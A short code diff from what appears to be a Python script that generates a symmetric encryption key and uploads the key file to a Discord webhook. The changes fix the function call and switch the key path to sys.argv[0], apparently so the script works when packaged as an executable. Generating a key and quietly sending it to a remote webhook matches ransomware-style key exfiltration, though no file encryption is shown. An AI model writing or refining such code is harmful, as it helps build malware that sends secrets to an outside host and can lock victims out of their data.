@@ -132,7 +132,7 @@ def generateKey():
     print(f"Generated symmetric key at {key_file_path}")
 
     # Send the key to Discord or another location (your existing function)
-    send_key_to_discord(key)
+    send_key_to_discord()
 
 def send_key_to_discord():
     # Replace with your Discord webhook URL
@@ -147,7 +147,7 @@ def send_key_to_discord():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp
 
     # Open the symmetric_key.key file to attach
-    key_file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
+    key_file_path = f'{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key'
     files = {
         'file': ('symmetric_key.key', open(key_file_path, 'rb'))  # File part
     }
